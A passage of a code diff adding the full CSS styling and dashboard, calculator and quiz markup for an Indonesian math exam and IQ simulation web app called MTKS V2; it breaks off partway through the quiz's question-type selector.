@@ -14,27 +14,1474 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
     
-    <!-- Firebase Config -->
-    <script src="firebase-config.js"></script>
-    
     <style>
-        /* ... CSS SAMA SEPERTI SEBELUMNYA ... */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #070a14;
+            --bg-secondary: #0e1322;
+            --bg-card: rgba(18, 24, 40, 0.85);
+            --bg-card-solid: #11172b;
+            --border-glow: rgba(79, 70, 229, 0.3);
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --primary-light: #818cf8;
+            --secondary: #06b6d4;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --error: #ef4444;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --radius-sm: 12px;
+            --radius-md: 20px;
+            --radius-lg: 28px;
+        }
+
+        body {
+            font-family: 'Inter', 'Courier New', monospace;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            font-weight: 500;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(6, 182, 212, 0.06) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            z-index: -1;
+        }
+
+        header {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px 20px 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .logo-shape {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .brand-info h1 {
+            font-size: 1.35rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            font-family: 'Inter', monospace;
+        }
+
+        .brand-info span {
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .badge-pro {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            font-size: 0.6rem;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-weight: 700;
+        }
+
+        .developer-badge {
+            font-size: 0.7rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 6px 14px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: var(--text-secondary);
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .developer-badge:hover {
+            background: rgba(239, 68, 68, 0.15);
+            border-color: var(--error);
+            color: #f87171;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 0 16px 100px;
+        }
+
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .card-header h2 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: -0.2px;
+            font-family: 'Inter', monospace;
+        }
+
+        .menu-grid-box {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .menu-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--radius-md);
+            padding: 16px 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: center;
+        }
+        .menu-box:hover {
+            background: rgba(99, 102, 241, 0.12);
+            border-color: var(--primary);
+            transform: translateY(-3px);
+        }
+        .menu-box .icon-box {
+            width: 48px;
+            height: 48px;
+            background: rgba(99, 102, 241, 0.12);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-light);
+        }
+        .menu-box .icon-box svg {
+            width: 24px;
+            height: 24px;
+            stroke: currentColor;
+            stroke-width: 1.8;
+            fill: none;
+        }
+        .menu-box .label {
+            font-weight: 700;
+            font-size: 0.8rem;
+        }
+        .menu-box .sub {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .menu-bottom {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin-top: 4px;
+        }
+        .menu-bottom-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            padding: 16px 20px;
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+        .menu-bottom-item:hover {
+            background: rgba(99, 102, 241, 0.08);
+            border-color: var(--primary);
+        }
+        .menu-bottom-item .icon-box {
+            width: 40px;
+            height: 40px;
+            background: rgba(99, 102, 241, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-light);
+        }
+        .menu-bottom-item .icon-box svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 1.8;
+            fill: none;
+        }
+        .menu-bottom-item .label {
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+        .menu-bottom-item .sub {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+        }
+
+        .timer-container {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid rgba(99, 102, 241, 0.3);
+        }
+
+        .timer-label {
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .timer-display {
+            font-size: 2.5rem;
+            font-weight: 700;
+            font-family: 'Inter', monospace;
+            letter-spacing: 2px;
+        }
+
+        .timer-display.warning {
+            color: var(--warning);
+            animation: pulse 1s infinite;
+        }
+
+        .timer-display.danger {
+            color: var(--error);
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .calc-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .calc-btn {
+            aspect-ratio: 1;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', monospace;
+        }
+
+        .calc-btn:active {
+            transform: scale(0.96);
+            background: rgba(99, 102, 241, 0.2);
+        }
+
+        .calc-btn.op {
+            color: var(--secondary);
+            background: rgba(6, 182, 212, 0.08);
+        }
+
+        .calc-btn.fn {
+            color: var(--primary-light);
+            font-size: 0.9rem;
+        }
+
+        .calc-btn.eq {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            color: white;
+            aspect-ratio: auto;
+            grid-column: span 2;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            font-family: 'Inter', monospace;
+            transition: all 0.2s ease;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border: none;
+            border-radius: var(--radius-sm);
+            color: white;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: 'Inter', monospace;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #10b981, #059669);
+        }
+
+        .output-display {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-md);
+            padding: 18px;
+            margin: 16px 0;
+            text-align: right;
+            font-size: 1.1rem;
+            font-weight: 600;
+            word-break: break-word;
+            font-family: 'Inter', monospace;
+        }
+
+        .output-result {
+            color: var(--success);
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        .score {
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary-light);
+            margin: 16px 0;
+            font-family: 'Inter', monospace;
+        }
+
+        .history-item {
+            padding: 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            transition: background 0.2s;
+        }
+
+        .history-item:hover {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .result-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 16px;
+        }
+
+        .result-table th,
+        .result-table td {
+            padding: 12px 8px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .result-table th {
+            color: var(--primary-light);
+            font-weight: 700;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .result-table td {
+            font-size: 0.85rem;
+            font-family: 'Inter', monospace;
+        }
+
+        .result-table tr:hover td {
+            background: rgba(99, 102, 241, 0.05);
+        }
+
+        .result-benar {
+            color: var(--success);
+            font-weight: 700;
+        }
+
+        .result-salah {
+            color: var(--error);
+            font-weight: 700;
+        }
+
+        .nilai-akhir {
+            margin-top: 20px;
+            padding: 16px;
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(6, 182, 212, 0.1));
+            border-radius: var(--radius-md);
+            text-align: center;
+        }
+
+        .nilai-akhir h3 {
+            font-size: 1rem;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .nilai-akhir .nilai-besar {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--primary-light);
+            font-family: 'Inter', monospace;
+        }
+
+        .leaderboard-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            border-radius: var(--radius-sm);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            transition: background 0.2s;
+        }
+
+        .leaderboard-item:hover {
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .leaderboard-rank {
+            width: 28px;
+            height: 28px;
+            background: rgba(99, 102, 241, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: var(--primary-light);
+            flex-shrink: 0;
+        }
+
+        .leaderboard-rank.top1 {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            color: #78350f;
+        }
+
+        .leaderboard-rank.top2 {
+            background: linear-gradient(135deg, #94a3b8, #64748b);
+            color: #1e293b;
+        }
+
+        .leaderboard-rank.top3 {
+            background: linear-gradient(135deg, #d97706, #b45309);
+            color: #451a03;
+        }
+
+        .leaderboard-info {
+            flex: 1;
+        }
+
+        .leaderboard-username {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .leaderboard-username .me-badge {
+            background: rgba(99, 102, 241, 0.2);
+            color: var(--primary-light);
+            font-size: 0.55rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-left: 8px;
+            font-weight: 700;
+        }
+
+        .leaderboard-detail {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+        }
+
+        .leaderboard-iq {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #fcd34d;
+        }
+
+        .leaderboard-empty {
+            text-align: center;
+            padding: 30px 0;
+            color: var(--text-muted);
+        }
+
+        .profile-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            cursor: pointer;
+            border: 3px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .profile-avatar:hover {
+            border-color: var(--primary);
+            transform: scale(1.02);
+        }
+
+        .profile-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .profile-avatar .avatar-placeholder {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: white;
+        }
+
+        .profile-avatar .avatar-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            padding: 4px;
+            font-size: 0.55rem;
+            text-align: center;
+            color: white;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .profile-avatar:hover .avatar-overlay {
+            opacity: 1;
+        }
+
+        .profile-info {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .profile-info .username {
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+
+        .profile-info .email {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+
+        .profile-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 16px 0;
+        }
+
+        .profile-stat-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .profile-stat-box .value {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--primary-light);
+        }
+
+        .profile-stat-box .label {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .profile-level-stats {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .profile-level-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-size: 0.85rem;
+        }
+
+        .profile-level-item .level-name {
+            color: var(--text-secondary);
+        }
+
+        .profile-level-item .level-value {
+            font-weight: 700;
+            color: var(--primary-light);
+        }
+
+        .nav-dock {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 32px);
+            max-width: 550px;
+            background: rgba(10, 14, 23, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 12px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            z-index: 100;
+        }
+
+        .nav-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 8px 4px;
+            border-radius: 30px;
+            transition: all 0.2s ease;
+        }
+
+        .nav-item svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 1.8;
+            fill: none;
+        }
+
+        .nav-item.active {
+            color: var(--primary-light);
+            background: rgba(99, 102, 241, 0.12);
+        }
+
+        .nav-label {
+            font-size: 0.6rem;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: var(--secondary);
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .loading svg {
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #previewFoto {
+            margin: 16px 0;
+        }
+
+        #previewFoto img {
+            max-width: 100%;
+            border-radius: var(--radius-md);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .soal-display {
+            font-size: 1.4rem;
+            font-weight: 700;
+            text-align: center;
+            word-break: break-word;
+            font-family: 'Inter', monospace;
+        }
+
+        .iq-badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 0.8rem;
+            letter-spacing: 0.5px;
+            background: rgba(99, 102, 241, 0.2);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            color: var(--primary-light);
+        }
+
+        .iq-detail {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .chat-messages {
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 12px;
+            padding: 8px;
+            background: rgba(0,0,0,0.2);
+            border-radius: var(--radius-sm);
+        }
+        .chat-msg {
+            padding: 8px 12px;
+            margin-bottom: 6px;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.04);
+            font-size: 0.85rem;
+        }
+        .chat-msg.own {
+            background: rgba(99,102,241,0.15);
+            border-left: 3px solid var(--primary);
+        }
+        .chat-msg .time {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            margin-left: 8px;
+        }
+
+        .inline-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+        .inline-buttons .btn-inline {
+            flex: 1;
+            min-width: 120px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-family: 'Inter', monospace;
+        }
+        .btn-inline.primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+        }
+        .btn-inline.primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+        }
+        .btn-inline.success {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+        .btn-inline.success:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 18px;
+            }
+            .calc-btn {
+                font-size: 1rem;
+            }
+            .brand-info h1 {
+                font-size: 1.1rem;
+            }
+            .logo-shape {
+                width: 40px;
+                height: 40px;
+            }
+            .timer-display {
+                font-size: 1.8rem;
+            }
+            .soal-display {
+                font-size: 1.1rem;
+            }
+            .result-table th,
+            .result-table td {
+                padding: 8px 4px;
+                font-size: 0.75rem;
+            }
+            .nav-label {
+                font-size: 0.55rem;
+            }
+            .nav-item svg {
+                width: 18px;
+                height: 18px;
+            }
+            .menu-grid-box {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .inline-buttons .btn-inline {
+                min-width: 100px;
+                font-size: 0.75rem;
+                padding: 10px 14px;
+            }
+            .leaderboard-item {
+                padding: 8px 10px;
+            }
+            .leaderboard-username {
+                font-size: 0.8rem;
+            }
+            .leaderboard-iq {
+                font-size: 0.9rem;
+            }
+            .profile-stats {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 6px;
+            }
+            .profile-stat-box .value {
+                font-size: 1rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- ... HTML SAMA SEPERTI SEBELUMNYA ... -->
+
+    <header>
+        <div class="brand">
+            <div class="logo-shape">
+                <svg viewBox="0 0 24 24" width="22" height="22" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+                </svg>
+            </div>
+            <div class="brand-info">
+                <h1>MTKS<span class="badge-pro">V2</span></h1>
+                <span>Ujian Simulasi & IQ</span>
+            </div>
+        </div>
+        <div class="developer-badge" onclick="logoutMTKS()" title="Klik untuk Logout">
+            👤 <span id="userDisplay">User</span> | Logout
+        </div>
+    </header>
+
+    <div class="container">
+        
+        <!-- Main Menu -->
+        <div id="mainMenu" class="card">
+            <div class="card-header">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="1.8">
+                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                    <polyline points="9 22 9 12 15 12 15 22"/>
+                </svg>
+                <h2>Dashboard</h2>
+            </div>
+            <p style="color: var(--text-secondary); margin-bottom: 20px; line-height: 1.5; font-size: 0.85rem; font-weight: 500;">
+                Aplikasi matematika ujian simulasi dengan dukungan BigNumber & OCR.
+            </p>
+            
+            <div class="menu-grid-box">
+                <div class="menu-box" onclick="showSection('calculator')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <rect x="4" y="2" width="16" height="20" rx="2"/>
+                            <line x1="8" y1="6" x2="16" y2="6"/>
+                            <line x1="8" y1="10" x2="16" y2="10"/>
+                            <line x1="8" y1="14" x2="12" y2="14"/>
+                            <line x1="14" y1="14" x2="16" y2="14"/>
+                            <line x1="8" y1="18" x2="16" y2="18"/>
+                        </svg>
+                    </div>
+                    <div class="label">Kalkulator</div>
+                    <div class="sub">Scientific</div>
+                </div>
+
+                <div class="menu-box" onclick="showSection('quiz')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <path d="M9.5 2A2.5 2.5 0 0 1 12 4.5v15a2.5 2.5 0 0 1-4.96.44 2.5 2.5 0 0 1-2.96-3.08 3 3 0 0 1-.34-5.58 2.5 2.5 0 0 1 1.32-4.24 2.5 2.5 0 0 1 1.98-3A2.5 2.5 0 0 1 9.5 2Z"/>
+                            <path d="M14.5 2A2.5 2.5 0 0 0 12 4.5v15a2.5 2.5 0 0 0 4.96.44 2.5 2.5 0 0 0 2.96-3.08 3 3 0 0 0 .34-5.58 2.5 2.5 0 0 0-1.32-4.24 2.5 2.5 0 0 0-1.98-3A2.5 2.5 0 0 0 14.5 2Z"/>
+                        </svg>
+                    </div>
+                    <div class="label">Mulai Soal</div>
+                    <div class="sub">Timer System</div>
+                </div>
+
+                <div class="menu-box" onclick="showSection('customSoal')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+                            <circle cx="12" cy="13" r="4"/>
+                        </svg>
+                    </div>
+                    <div class="label">OCR Scanner</div>
+                    <div class="sub">Scan Image</div>
+                </div>
+
+                <div class="menu-box" onclick="showResultPage()">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                            <polyline points="14 2 14 8 20 8"/>
+                            <line x1="16" y1="13" x2="8" y2="13"/>
+                            <line x1="16" y1="17" x2="8" y2="17"/>
+                            <polyline points="10 9 9 9 8 9"/>
+                        </svg>
+                    </div>
+                    <div class="label">Raport & IQ</div>
+                    <div class="sub">Estimasi</div>
+                </div>
+            </div>
+
+            <div class="menu-bottom">
+                <div class="menu-bottom-item" onclick="showSection('profile')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                            <circle cx="12" cy="7" r="4"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="label">👤 Profile</div>
+                        <div class="sub">Lihat & edit profile</div>
+                    </div>
+                </div>
+                <div class="menu-bottom-item" onclick="showSection('history')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <circle cx="12" cy="12" r="10"/>
+                            <polyline points="12 6 12 12 16 14"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="label">📜 History</div>
+                        <div class="sub">Riwayat perhitungan</div>
+                    </div>
+                </div>
+                <div class="menu-bottom-item" onclick="showSection('chatOwner')">
+                    <div class="icon-box">
+                        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none">
+                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="label">💬 Chat Owner</div>
+                        <div class="sub">Kirim pesan ke pengembang</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Calculator Section -->
+        <div id="calculator" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="1.8">
+                    <rect x="4" y="2" width="16" height="20" rx="2"/>
+                </svg>
+                <h2>Scientific Calculator</h2>
+            </div>
+            
+            <div style="background: rgba(0,0,0,0.4); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 16px; text-align: right; font-size: 1.5rem; font-weight: 700; font-family: 'Inter', monospace; min-height: 60px;" id="calcDisplay">0</div>
+            
+            <div class="calc-grid">
+                <button class="calc-btn fn" onclick="clearCalc()">AC</button>
+                <button class="calc-btn fn" onclick="backspaceCalc()">DEL</button>
+                <button class="calc-btn fn" onclick="appendCalc('%')">%</button>
+                <button class="calc-btn op" onclick="appendCalc('/')">÷</button>
+                
+                <button class="calc-btn fn" onclick="appendCalc('sin(')">sin</button>
+                <button class="calc-btn fn" onclick="appendCalc('cos(')">cos</button>
+                <button class="calc-btn fn" onclick="appendCalc('√(')">√</button>
+                <button class="calc-btn op" onclick="appendCalc('^')">^</button>
+
+                <button class="calc-btn" onclick="appendCalc('7')">7</button>
+                <button class="calc-btn" onclick="appendCalc('8')">8</button>
+                <button class="calc-btn" onclick="appendCalc('9')">9</button>
+                <button class="calc-btn op" onclick="appendCalc('*')">×</button>
+                
+                <button class="calc-btn" onclick="appendCalc('4')">4</button>
+                <button class="calc-btn" onclick="appendCalc('5')">5</button>
+                <button class="calc-btn" onclick="appendCalc('6')">6</button>
+                <button class="calc-btn op" onclick="appendCalc('-')">-</button>
+                
+                <button class="calc-btn" onclick="appendCalc('1')">1</button>
+                <button class="calc-btn" onclick="appendCalc('2')">2</button>
+                <button class="calc-btn" onclick="appendCalc('3')">3</button>
+                <button class="calc-btn op" onclick="appendCalc('+')">+</button>
+                
+                <button class="calc-btn" onclick="appendCalc('0')">0</button>
+                <button class="calc-btn" onclick="appendCalc('.')">.</button>
+                <button class="calc-btn eq" onclick="hitungCalc()">=</button>
+                <button class="calc-btn op" onclick="appendCalc('(')">(</button>
+            </div>
+            
+            <div id="loadingCalculator" class="loading hidden">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+                </svg>
+                Memproses...
+            </div>
+            
+            <div>
+                <label style="font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600;">Hasil</label>
+                <div class="output-display" id="outputHasilCalc"></div>
+            </div>
+        </div>
+
+        <!-- Quiz Section -->
+        <div id="quiz" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="1.8">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+                </svg>
+                <h2>Math Quiz Challenge</h2>
+            </div>
+            
+            <div class="timer-container" id="timerContainer">
+                <div class="timer-label">⏱️ Waktu Tersisa</div>
+                <div class="timer-display" id="timerDisplay">00:00</div>
+            </div>
+            
+            <div style="display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px;">
+                <select id="tingkatPendidikan" onchange="updateQuizOptions()">
+                    <option value="tk">🎨 TK (Usia 4-6)</option>
+                    <option value="sd">👦 SD (Usia 6-12) - 5 Menit</option>
+                    <option value="smp">👨‍🎓 SMP (Usia 12-15) - 8 Menit</option>
+                    <option value="sma">👩‍🎓 SMA (Usia 15-18) - 12 Menit</option>
+                    <option value="mahasiswa">🎓 Universitas (Usia 18-20) - 15 Menit</option>
+                </select>
+                
+                <select id="jenisSoal">
+                    <option value="acak">🎲 Semua Soal</option>
+                    <option value="+">➕ Penjumlahan</option>
+                    <option value="-">➖ Pengurangan</option>
